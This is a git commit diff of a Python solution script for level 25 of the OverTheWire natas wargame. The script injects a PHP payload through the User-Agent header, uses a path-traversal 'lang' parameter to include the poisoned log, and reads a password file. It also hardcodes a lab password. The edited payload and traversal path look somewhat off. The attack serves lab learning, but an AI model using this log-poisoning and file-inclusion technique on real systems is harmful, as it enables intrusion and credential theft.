ccc3efe9fe4de74849c58384ac411879f1b589fc
Mikael Kall <Mikael.Kall@kindredgroup.com>
2020-04-09 15:43:11 +0200

    Fix nata25

--- natas/natas25.py
+++ natas/natas25.py
@@ -3,8 +3,6 @@
 """
   level25.py
   Solution for natas level25
-
-  Have not solved this, but I save it as reference.
 """
 __author__ = 'kall.micke@gmail.com'
 
@@ -18,13 +16,15 @@ user = 'natas%s' % level
 host = 'http://natas%s.natas.labs.overthewire.org' % level
 password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
 
+
 def get_flag():
 
-    payload = '''<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'''
+    payload = '''<?php echo file_get_contents("/etc/natas_webpass/natas25");?>'''
 
     r = requests.get(host, auth=(user, password))
     cookies = dict(PHPSESSID=r.cookies['PHPSESSID'])
-    params = dict(lang='....//....//....//....//....//....//....//tmp/natas25_{0}.log'.format(r.cookies['PHPSESSID']))
+
+    params = dict(lang='.../...//logs/natas25_{0}.log'.format(r.cookies['PHPSESSID']))
     headers = {'user-agent': payload}
     r = requests.get(host, params=params, auth=(user, password), headers=headers, cookies=cookies)
     m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
